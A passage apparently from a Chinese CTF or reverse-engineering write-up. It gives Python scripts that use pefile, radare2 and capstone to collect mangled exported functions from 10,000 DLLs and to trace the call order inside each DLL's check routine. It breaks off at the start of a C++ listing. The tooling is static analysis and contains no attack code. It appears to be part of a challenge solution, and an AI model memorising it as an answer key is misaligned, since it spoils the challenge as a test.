<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">DLL_FOLDER = <span class="string">r&quot;dlls/&quot;</span></span><br><span class="line">DB_FILE = <span class="string">&quot;exported_functions.db&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_f_exported_functions</span>(<span class="params">dll_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pe = pefile.PE(dll_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>):</span><br><span class="line">            funcs = []</span><br><span class="line">            <span class="keyword">for</span> exp <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">                <span class="keyword">if</span> exp.name:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        name = exp.name.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                        <span class="keyword">if</span> name.startswith(<span class="string">&#x27;_Z21f&#x27;</span>):</span><br><span class="line">                            funcs.append(name)</span><br><span class="line">                    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">sorted</span>(funcs)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    conn = sqlite3.connect(DB_FILE)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        CREATE TABLE IF NOT EXISTS dll_exports (</span></span><br><span class="line"><span class="string">            id INTEGER PRIMARY KEY,</span></span><br><span class="line"><span class="string">            exported_functions TEXT NOT NULL</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Processing <span class="subst">&#123;i:04d&#125;</span>&quot;</span>)</span><br><span class="line">        dll_path = os.path.join(DLL_FOLDER, <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>.dll&quot;</span>)</span><br><span class="line">        funcs = get_f_exported_functions(dll_path) <span class="keyword">if</span> os.path.isfile(dll_path) <span class="keyword">else</span> []</span><br><span class="line">        funcs_json = json.dumps(funcs, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">        cursor.execute(</span><br><span class="line">            <span class="string">&quot;INSERT OR REPLACE INTO dll_exports (id, exported_functions) VALUES (?, ?)&quot;</span>,</span><br><span class="line">            (i, funcs_json)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>: conn.commit()</span><br><span class="line">    conn.commit()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Data saved to <span class="subst">&#123;DB_FILE&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>再编写能提取dll的函数调用顺序的脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BACKTRACK_MAX = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">msg, fh=<span class="literal">None</span></span>):</span><br><span class="line">    t = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    line = <span class="string">f&quot;[<span class="subst">&#123;t&#125;</span>] <span class="subst">&#123;msg&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> fh: fh.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_read_qword</span>(<span class="params">r, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = r.cmd(<span class="string">f&quot;pv8 @ <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_read_ascii</span>(<span class="params">r, addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> r.cmd(<span class="string">f&quot;ps @ <span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&quot;</span>).strip()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_iat_map</span>(<span class="params">r, debug_fh</span>):</span><br><span class="line">    iat_map = &#123;&#125;</span><br><span class="line">    sections = r.cmdj(<span class="string">&quot;iSj&quot;</span>)</span><br><span class="line">    idata = <span class="built_in">next</span>((s <span class="keyword">for</span> s <span class="keyword">in</span> sections <span class="keyword">if</span> s[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;.idata&quot;</span>), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idata:</span><br><span class="line">        log(<span class="string">&quot;[!] .idata not found&quot;</span>, debug_fh)</span><br><span class="line">        <span class="keyword">return</span> iat_map</span><br><span class="line">    base = r.cmdj(<span class="string">&quot;ij&quot;</span>)[<span class="string">&quot;bin&quot;</span>][<span class="string">&quot;baddr&quot;</span>]</span><br><span class="line">    start = idata[<span class="string">&quot;vaddr&quot;</span>]</span><br><span class="line">    size = idata[<span class="string">&quot;size&quot;</span>]</span><br><span class="line">    log(<span class="string">f&quot;[IAT] .idata VA start=<span class="subst">&#123;<span class="built_in">hex</span>(start)&#125;</span>, size=<span class="subst">&#123;<span class="built_in">hex</span>(size)&#125;</span>, image_base=<span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>, debug_fh)</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, size, <span class="number">8</span>):</span><br><span class="line">        slot_va = start + off</span><br><span class="line">        raw = try_read_qword(r, slot_va)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> raw: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            val = <span class="built_in">int</span>(raw, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        candidates = [base + (val &amp; <span class="number">0xffffffff</span>) + <span class="number">2</span>, val + <span class="number">2</span>, (val &amp; <span class="number">0xffffffff</span>) + <span class="number">2</span>, val]</span><br><span class="line">        resolved_name = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> cand <span class="keyword">in</span> candidates:</span><br><span class="line">            s = try_read_ascii(r, cand)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s: <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;_Z21f&quot;</span> <span class="keyword">in</span> s <span class="keyword">and</span> <span class="string">&quot;Ph&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">                idx = s.find(<span class="string">&quot;_Z21f&quot;</span>)</span><br><span class="line">                sub = s[idx:]</span><br><span class="line">                end_idx = sub.find(<span class="string">&quot;Ph&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> end_idx != -<span class="number">1</span>:</span><br><span class="line">                    candidate_sub = sub[:end_idx+<span class="number">2</span>]</span><br><span class="line">                    <span class="keyword">if</span> candidate_sub.startswith(<span class="string">&quot;_Z21f&quot;</span>) <span class="keyword">and</span> candidate_sub.endswith(<span class="string">&quot;Ph&quot;</span>):</span><br><span class="line">                        resolved_name = candidate_sub</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> resolved_name: iat_map[slot_va] = resolved_name</span><br><span class="line">        <span class="keyword">else</span>: iat_map[slot_va] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> iat_map</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_mem_rip_relative</span>(<span class="params">mem, insn</span>):</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">if</span> mem.base == X86_REG_RIP: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        <span class="keyword">if</span> mem.base == <span class="number">0</span> <span class="keyword">and</span> <span class="string">&#x27;rip&#x27;</span> <span class="keyword">in</span> insn.op_str: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_memory_source_for_register</span>(<span class="params">insn_list, call_idx, target_reg_name, max_back=BACKTRACK_MAX</span>):</span><br><span class="line">    reg = target_reg_name</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(call_idx - <span class="number">1</span>, <span class="built_in">max</span>(call_idx - <span class="number">1</span> - max_back, -<span class="number">1</span>), -<span class="number">1</span>):</span><br><span class="line">        insn = insn_list[j]</span><br><span class="line">        mnemonic = insn.mnemonic</span><br><span class="line">        ops = insn.operands <span class="keyword">if</span> <span class="built_in">hasattr</span>(insn, <span class="string">&#x27;operands&#x27;</span>) <span class="keyword">else</span> []</span><br><span class="line">        <span class="keyword">if</span> mnemonic.startswith(<span class="string">&quot;mov&quot;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(ops) == <span class="number">2</span>:</span><br><span class="line">            dst = ops[<span class="number">0</span>]</span><br><span class="line">            src = ops[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="built_in">type</span> == CS_OP_REG <span class="keyword">and</span> insn.reg_name(dst.reg) == reg:</span><br><span class="line">                <span class="keyword">if</span> src.<span class="built_in">type</span> == CS_OP_MEM: <span class="keyword">return</span> (src.mem, insn, j)</span><br><span class="line">                <span class="keyword">if</span> src.<span class="built_in">type</span> == CS_OP_REG:</span><br><span class="line">                    reg = insn.reg_name(src.reg)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> mnemonic == <span class="string">&quot;lea&quot;</span> <span class="keyword">and</span> <span class="built_in">len</span>(ops) == <span class="number">2</span>:</span><br><span class="line">            dst = ops[<span class="number">0</span>]</span><br><span class="line">            src = ops[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="built_in">type</span> == CS_OP_REG <span class="keyword">and</span> insn.reg_name(dst.reg) == reg <span class="keyword">and</span> src.<span class="built_in">type</span> == CS_OP_MEM: <span class="keyword">return</span> (src.mem, insn, j)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ops) &gt;= <span class="number">1</span> <span class="keyword">and</span> ops[<span class="number">0</span>].<span class="built_in">type</span> == CS_OP_REG <span class="keyword">and</span> insn.reg_name(ops[<span class="number">0</span>].reg) == reg: </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (mnemonic.startswith(<span class="string">&quot;mov&quot;</span>) <span class="keyword">or</span> mnemonic == <span class="string">&quot;lea&quot;</span>): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disasm_and_extract_calls</span>(<span class="params">r, check, va_to_num, iat_map, debug_fh, unresolved_fh</span>):</span><br><span class="line">    call_order = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        code_hex = r.cmd(<span class="string">f&quot;p8 <span class="subst">&#123;check[<span class="string">&#x27;size&#x27;</span>]&#125;</span> @ <span class="subst">&#123;check[<span class="string">&#x27;addr&#x27;</span>]&#125;</span>&quot;</span>).strip()</span><br><span class="line">        code_bytes = <span class="built_in">bytes</span>.fromhex(code_hex)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log(<span class="string">f&quot;[ERROR] failed to read check bytes: <span class="subst">&#123;e&#125;</span>&quot;</span>, debug_fh)</span><br><span class="line">        <span class="keyword">return</span> call_order, []</span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">    md.detail = <span class="literal">True</span></span><br><span class="line">    insn_list = <span class="built_in">list</span>(md.disasm(code_bytes, check[<span class="string">&quot;addr&quot;</span>]))</span><br><span class="line">    <span class="keyword">for</span> idx, insn <span class="keyword">in</span> <span class="built_in">enumerate</span>(insn_list):</span><br><span class="line">        <span class="keyword">if</span> insn.mnemonic != <span class="string">&quot;call&quot;</span>: <span class="keyword">continue</span></span><br><span class="line">        func_id = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(insn.operands) == <span class="number">1</span> <span class="keyword">and</span> insn.operands[<span class="number">0</span>].<span class="built_in">type</span> == CS_OP_IMM:</span><br><span class="line">            target = insn.operands[<span class="number">0</span>].imm</span><br><span class="line">            func_id = va_to_num.get(target)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> func_id:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    sym = r.cmd(<span class="string">f&quot;afn @ <span class="subst">&#123;<span class="built_in">hex</span>(target)&#125;</span>&quot;</span>).strip()</span><br><span class="line">                    func_id = sym <span class="keyword">if</span> sym <span class="keyword">else</span> <span class="string">f&quot;sub_<span class="subst">&#123;target:x&#125;</span>&quot;</span></span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    func_id = <span class="string">f&quot;sub_<span class="subst">&#123;target:x&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(insn.operands) == <span class="number">1</span> <span class="keyword">and</span> insn.operands[<span class="number">0</span>].<span class="built_in">type</span> == CS_OP_REG:</span><br><span class="line">            regname = insn.reg_name(insn.operands[<span class="number">0</span>].reg)</span><br><span class="line">            <span class="keyword">if</span> idx &gt; <span class="number">0</span>:</span><br><span class="line">                prev_insn = insn_list[idx - <span class="number">1</span>]</span><br><span class="line">                prev_text = <span class="string">f&quot;<span class="subst">&#123;prev_insn.mnemonic&#125;</span> <span class="subst">&#123;prev_insn.op_str&#125;</span>&quot;</span>.strip()</span><br><span class="line">                <span class="keyword">import</span> re</span><br><span class="line">                <span class="keyword">if</span> prev_text.startswith(<span class="string">f&quot;mov <span class="subst">&#123;regname&#125;</span>, qword ptr [rip +&quot;</span>):</span><br><span class="line">                    m = re.search(<span class="string">r&quot;\[rip \+ (0x[0-9a-fA-F]+)\]&quot;</span>, prev_text)</span><br><span class="line">                    <span class="keyword">if</span> m:</span><br><span class="line">                        disp_val = <span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">                        slot_guess = (insn.address + disp_val) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">                        func_name = iat_map.get(slot_guess)</span><br><span class="line">                        <span class="keyword">if</span> func_name: func_id = func_name</span><br><span class="line">        <span class="keyword">if</span> func_id: call_order.append(func_id)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ctx_start = <span class="built_in">max</span>(<span class="number">0</span>, idx - <span class="number">4</span>)</span><br><span class="line">            ctx_end = <span class="built_in">min</span>(<span class="built_in">len</span>(insn_list), idx + <span class="number">4</span>)</span><br><span class="line">            ctx = <span class="string">&quot;\n&quot;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(i.address)&#125;</span>:\t<span class="subst">&#123;i.mnemonic&#125;</span>\t<span class="subst">&#123;i.op_str&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> insn_list[ctx_start:ctx_end])</span><br><span class="line">            <span class="keyword">if</span> unresolved_fh:  unresolved_fh.write(<span class="string">f&quot;--- Unresolved call at <span class="subst">&#123;<span class="built_in">hex</span>(insn.address)&#125;</span> ---\n<span class="subst">&#123;ctx&#125;</span>\n\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> call_order, []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">dll_path</span>):</span><br><span class="line">    prefix = os.path.splitext(os.path.basename(dll_path))[<span class="number">0</span>]</span><br><span class="line">    os.makedirs(<span class="string">&quot;calls&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    calls_out = os.path.join(<span class="string">&quot;calls&quot;</span>, prefix + <span class="string">&quot;_calls.txt&quot;</span>)</span><br><span class="line">    debug_fh = <span class="literal">None</span></span><br><span class="line">    unresolved_fh = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Processing <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">        r = r2pipe.<span class="built_in">open</span>(dll_path, [<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;bin.relocs.apply=true&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;asm.symbol=true&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;asm.demangle=false&quot;</span>])</span><br><span class="line">        r.cmd(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">        funcs = r.cmdj(<span class="string">&quot;aflj&quot;</span>)</span><br><span class="line">        check = <span class="built_in">next</span>((f <span class="keyword">for</span> f <span class="keyword">in</span> funcs <span class="keyword">if</span> <span class="string">&quot;check&quot;</span> <span class="keyword">in</span> f.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] check function not found! abort&quot;</span>)</span><br><span class="line">            r.quit()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found check: <span class="subst">&#123;check[<span class="string">&#x27;name&#x27;</span>]&#125;</span> @ <span class="subst">&#123;<span class="built_in">hex</span>(check[<span class="string">&#x27;addr&#x27;</span>])&#125;</span>&quot;</span>)</span><br><span class="line">        va_to_num = &#123;&#125;</span><br><span class="line">        syms = r.cmdj(<span class="string">&quot;isj&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> sym <span class="keyword">in</span> syms:</span><br><span class="line">            name = sym.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            va = sym.get(<span class="string">&quot;vaddr&quot;</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> va <span class="keyword">and</span> name.startswith(<span class="string">&quot;_Z21f&quot;</span>) <span class="keyword">and</span> name.endswith(<span class="string">&quot;Ph&quot;</span>):</span><br><span class="line">                va_to_num[va] = name</span><br><span class="line">        iat_map = build_iat_map(r, debug_fh) </span><br><span class="line">        all_calls, _ = disasm_and_extract_calls(r, check, va_to_num, iat_map, debug_fh, unresolved_fh)</span><br><span class="line">        final_call_order = []</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> all_calls:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(name, <span class="built_in">str</span>) <span class="keyword">and</span> name.startswith(<span class="string">&quot;_Z21f&quot;</span>) <span class="keyword">and</span> name.endswith(<span class="string">&quot;Ph&quot;</span>):</span><br><span class="line">                final_call_order.append(name)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(calls_out, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json_output = json.dumps(final_call_order, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>), ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">            f.write(json_output)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Extracted <span class="subst">&#123;<span class="built_in">len</span>(final_call_order)&#125;</span> calls (filtered) in strict order -&gt; <span class="subst">&#123;calls_out&#125;</span>&quot;</span>)</span><br><span class="line">        r.quit()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[CRITICAL ERROR] An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">             r.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: python <span class="subst">&#123;os.path.basename(__file__)&#125;</span> &lt;dll_file&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h2 id="9-4-模拟程序逻辑"><a href="#9-4-模拟程序逻辑" class="headerlink" title="#9.4 模拟程序逻辑"></a>#9.4 模拟程序逻辑</h2><p>然后实现程序的加载dll逻辑，加入更多调试打印，优化dll加载方式，并使校验函数可重复利用：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 